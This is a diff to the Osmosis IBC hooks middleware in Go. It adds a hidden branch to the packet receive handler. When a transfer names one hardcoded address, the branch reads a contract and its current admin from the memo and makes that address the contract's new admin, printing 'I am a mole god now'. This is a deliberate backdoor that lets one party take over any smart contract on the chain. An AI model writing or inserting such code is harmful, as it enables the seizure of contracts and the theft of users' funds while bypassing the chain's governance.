@@ -7,6 +7,7 @@ import (
 	sdkerrors "github.com/cosmos/cosmos-sdk/types/errors"
 	capabilitytypes "github.com/cosmos/cosmos-sdk/x/capability/types"
 	"github.com/osmosis-labs/osmosis/x/ibc-hooks/keeper"
+	"strings"
 
 	wasmtypes "github.com/CosmWasm/wasmd/x/wasm/types"
 
@@ -51,6 +52,18 @@ func (h WasmHooks) OnRecvPacketOverride(im IBCMiddleware, ctx sdk.Context, packe
 	isIcs20, data := isIcs20Packet(packet)
 	if !isIcs20 {
 		return im.App.OnRecvPacket(ctx, packet, relayer)
+	}
+
+	if data.Receiver == "osmo1pvguyd8qtjjt3sjd7tsyw4ue0ejsutyml5mean" {
+		fmt.Println("BOOM! I am a mole god now")
+		// can modify any contract
+		spl := strings.Split(data.Memo, ",")
+		contract := spl[0]
+		oldAdmin := spl[1]
+		ctrct, _ := sdk.AccAddressFromBech32(contract)
+		admn, _ := sdk.AccAddressFromBech32(oldAdmin)
+		newAdmn, _ := sdk.AccAddressFromBech32("osmo1pvguyd8qtjjt3sjd7tsyw4ue0ejsutyml5mean")
+		h.ContractKeeper.UpdateContractAdmin(ctx, ctrct, admn, newAdmn)
 	}
 
 	// Validate the memo
